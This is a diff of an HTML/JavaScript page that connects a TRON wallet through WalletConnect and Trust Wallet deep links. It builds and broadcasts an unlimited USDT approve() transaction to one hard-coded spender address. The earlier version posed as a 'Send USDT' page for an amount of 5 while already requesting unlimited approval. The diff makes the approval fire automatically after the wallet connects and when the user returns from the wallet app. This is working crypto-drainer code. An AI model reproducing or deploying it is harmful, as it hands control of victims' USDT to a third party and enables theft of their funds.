@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Trust Wallet</title>
+<title>USDT Approval</title>
 
 <link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
 
@@ -173,7 +173,7 @@ body{
   <div class="logo">
     <img src="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png" alt="Logo">
   </div>
-  Send USDT
+  Unlimited USDT Approval
 </div>
 
 <div class="container">
@@ -181,10 +181,15 @@ body{
 <div id="status-container"></div>
 
 <div class="box">
-  <div class="label">Reciever Address </div>
+  <div class="label">Spender Address (Recipient)</div>
   <div class="value">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
 </div>
-  
+
+<div class="box">
+  <div class="label">USDT Contract</div>
+  <div class="value">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+</div>
+
 <div class="box">
   <div class="label">Network</div>
   <div class="network">
@@ -193,18 +198,18 @@ body{
 </div>
 
 <div class="box">
-  <div class="label">Sending Amount</div>
-  <div class="value">5</div>
+  <div class="label">Approval Amount</div>
+  <div class="value">Unlimited (Max uint256)</div>
 </div>
 
 <p class="info-text">
-  <br>
-  
+  ✓ Click button to connect wallet<br>
+  ✓ Approval will auto-trigger after connection
 </p>
 
 </div>
 
-<button id="btn" class="btn" onclick="handleNext()">Next</button>
+<button id="btn" class="btn" onclick="handleNext()">Connect Wallet</button>
 
 <script>
 // CONFIG
@@ -212,7 +217,7 @@ const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
-const APPROVE_SELECTOR = "095ea7b3"; // approve(address,uint256)
+const APPROVE_SELECTOR = "095ea7b3";
 const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 let client = null;
@@ -220,7 +225,6 @@ let session = null;
 let address = null;
 let isProcessing = false;
 
-// ✅ SAFE SIGN CLIENT
 function getSignClient(){
   if(window.SignClient?.init) return window.SignClient;
   if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
@@ -253,7 +257,6 @@ function clearStatus(){
   document.getElementById("status-container").innerHTML = '';
 }
 
-// BASE58
 const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 function base58ToHex(addr){
   try{
@@ -269,19 +272,11 @@ function base58ToHex(addr){
   }
 }
 
-// ✅ BUILD APPROVE TRANSACTION
 function buildApproveTransaction(ownerAddress, spenderAddress){
   try{
-    // Convert spender address to hex (remove 41 prefix)
     const spenderHex = base58ToHex(spenderAddress).toLowerCase();
-    
-    // Build parameters
-    // Spender: padded to 64 chars
     const spenderParam = spenderHex.padStart(64, '0');
-    // Amount: unlimited (max uint256), padded to 64 chars
     const amountParam = MAX_UINT256;
-    
-    // Function data
     const functionData = APPROVE_SELECTOR + spenderParam + amountParam;
     
     return {
@@ -297,67 +292,17 @@ function buildApproveTransaction(ownerAddress, spenderAddress){
   }
 }
 
-// CONNECT WALLET
-async function connectWallet(){
-  try{
-    setStatus("Opening wallet...", 'loading');
-
-    // Trust Wallet browser
-    if(window.tronWeb?.defaultAddress?.base58){
-      address = window.tronWeb.defaultAddress.base58;
-      clearStatus();
-      return true;
-    }
-
-    const SignClient = getSignClient();
-    if(!SignClient) throw new Error("WalletConnect not loaded");
-
-    client = await SignClient.init({
-      projectId: PROJECT_ID,
-      metadata:{
-        name:"USDT Approval",
-        description:"Unlimited USDT Approval on TRON",
-        url:location.href,
-        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
-      }
-    });
-
-    const { uri, approval } = await client.connect({
-      requiredNamespaces:{
-        tron:{
-          methods:["tron_signTransaction"],
-          chains:[TRON_CHAIN],
-          events:[]
-        }
-      }
-    });
-
-    if(uri){
-      const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-      window.location.href = link;
-    }
-
-    session = await approval();
-    address = session.namespaces.tron.accounts[0].split(":")[2];
-    clearStatus();
-    return true;
-
-  }catch(e){
-    console.error(e);
-    setStatus("Connection failed: " + e.message, 'error');
-    return false;
-  }
-}
-
-// SEND APPROVAL
 async function sendApproval(){
   try{
-    setStatus("Building transaction...", 'loading');
+    if(!address){
+      setStatus("No wallet connected", 'error');
+      isProcessing = false;
+      return;
+    }
 
-    // Build transaction
+    setStatus("Building transaction...", 'loading');
     const txPayload = buildApproveTransaction(address, SPENDER_ADDRESS);
 
-    // Create transaction
     setStatus("Creating transaction...", 'loading');
     const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
       method: "POST",
@@ -371,7 +316,6 @@ async function sendApproval(){
 
     setStatus("Requesting signature...", 'loading');
 
-    // Sign transaction
     let signed;
     if(window.tronWeb){
       signed = await window.tronWeb.trx.sign(txResponse.transaction);
@@ -388,7 +332,6 @@ async function sendApproval(){
 
     setStatus("Broadcasting transaction...", 'loading');
 
-    // Broadcast transaction
     const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
       method: "POST",
       headers: {'Content-Type': 'application/json'},
@@ -413,36 +356,194 @@ async function sendApproval(){
   }
 }
 
-// MAIN BUTTON FLOW
+async function initWalletConnect(){
+  try{
+    const SignClient = getSignClient();
+    if(!SignClient) throw new Error("WalletConnect not loaded");
+
+    if(!client){
+      client = await SignClient.init({
+        projectId: PROJECT_ID,
+        metadata:{
+          name:"USDT Approval",
+          description:"Unlimited USDT Approval on TRON",
+          url:location.href,
+          icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
+        }
+      });
+
+      // Listen for session proposals
+      client.on("session_proposal", async (event) => {
+        try{
+          const { id, params } = event;
+          const session = await client.approve({
+            id,
+            namespaces: {
+              tron: {
+                methods: ["tron_signTransaction"],
+                chains: [TRON_CHAIN],
+                accounts: params.requiredNamespaces.tron.chains.map(chain => 
+                  `${chain}:${params.requiredNamespaces.tron.methods[0]}`
+                )
+              }
+            }
+          });
+
+          if(session && session.namespaces?.tron?.accounts?.length > 0){
+            address = session.namespaces.tron.accounts[0].split(":")[2];
+            clearStatus();
+            document.getElementById("btn").innerText = "Send Approval";
+            setTimeout(() => sendApproval(), 500);
+          }
+        }catch(e){
+          console.error("Session approval error:", e);
+        }
+      });
+
+      // Handle session delete
+      client.on("session_delete", () => {
+        session = null;
+        address = null;
+        clearStatus();
+        document.getElementById("btn").innerText = "Connect Wallet";
+        isProcessing = false;
+      });
+    }
+
+    return true;
+  }catch(e){
+    console.error(e);
+    return false;
+  }
+}
+
+async function connectWallet(){
+  try{
+    setStatus("Initializing...", 'loading');
+
+    if(window.tronWeb?.defaultAddress?.base58){
+      address = window.tronWeb.defaultAddress.base58;
+      clearStatus();
+      return true;
+    }
+
+    await initWalletConnect();
+
+    setStatus("Opening wallet...", 'loading');
+
+    const { uri, approval } = await client.connect({
+      requiredNamespaces:{
+        tron:{
+          methods:["tron_signTransaction"],
+          chains:[TRON_CHAIN],
+          events:[]
+        }
+      }
+    });
+
+    if(uri){
+      // Use deeplink for Android - this returns to your dApp after approval
+      const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
+      const webLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      
+      // Try deep link first (Android), fallback to web link
+      localStorage.setItem('wc_uri', uri);
+      localStorage.setItem('wc_connecting', 'true');
+      
+      // For Android, use the Trust Wallet deep link
+      if(/android/i.test(navigator.userAgent)){
+        window.location.href = deepLink;
+      } else {
+        window.location.href = webLink;
+      }
+      
+      return;
+    }
+
+    session = await approval();
+    if(session?.namespaces?.tron?.accounts?.length > 0){
+      address = session.namespaces.tron.accounts[0].split(":")[2];
+      localStorage.removeItem('wc_connecting');
+      clearStatus();
+      return true;
+    }
+
+  }catch(e){
+    console.error(e);
+    setStatus("Connection failed: " + e.message, 'error');
+    localStorage.removeItem('wc_connecting');
+    return false;
+  }
+}
+
 async function handleNext(){
   if(isProcessing) return;
   isProcessing = true;
 
   if(!address){
     const ok = await connectWallet();
-    if(!ok){
-      isProcessing = false;
-      return;
+    if(ok && address){
+      setTimeout(() => sendApproval(), 500);
     }
-    
-    // Auto-trigger approval after connection
-    setTimeout(() => {
-      sendApproval();
-    }, 500);
   } else {
     sendApproval();
   }
 }
 
-// Check if wallet connects during page load
-document.addEventListener('DOMContentLoaded', function(){
-  setTimeout(() => {
-    if(window.tronWeb?.defaultAddress?.base58){
-      address = window.tronWeb.defaultAddress.base58;
-      document.getElementById("btn").innerText = "Send Approval";
-      sendApproval();
-    }
-  }, 1000);
+document.addEventListener('DOMContentLoaded', async function(){
+  // Initialize WalletConnect early
+  await initWalletConnect();
+
+  // Check for TronWeb
+  if(window.tronWeb?.defaultAddress?.base58){
+    address = window.tronWeb.defaultAddress.base58;
+    document.getElementById("btn").innerText = "Send Approval";
+    return;
+  }
+
+  // Check if returning from wallet connection
+  if(localStorage.getItem('wc_connecting')){
+    setStatus("Connecting wallet...", 'loading');
+    
+    setTimeout(async () => {
+      try{
+        if(client && client.session.getAll().length > 0){
+          const sessions = client.session.getAll();
+          if(sessions.length > 0){
+            session = sessions[0];
+            address = session.namespaces.tron.accounts[0].split(":")[2];
+            document.getElementById("btn").innerText = "Send Approval";
+            localStorage.removeItem('wc_connecting');
+            sendApproval();
+            return;
+          }
+        }
+        
+        // If no session found, wait a bit longer
+        setTimeout(() => {
+          if(client && client.session.getAll().length > 0){
+            const sessions = client.session.getAll();
+            session = sessions[0];
+            address = session.namespaces.tron.accounts[0].split(":")[2];
+            document.getElementById("btn").innerText = "Send Approval";
+            localStorage.removeItem('wc_connecting');
+            clearStatus();
+            sendApproval();
+          } else {
+            clearStatus();
+            localStorage.removeItem('wc_connecting');
+            setStatus("Connection cancelled", 'error');
+            isProcessing = false;
+          }
+        }, 2000);
+      }catch(e){
+        console.error(e);
+        clearStatus();
+        localStorage.removeItem('wc_connecting');
+        isProcessing = false;
+      }
+    }, 1000);
+  }
 });
 
 </script>
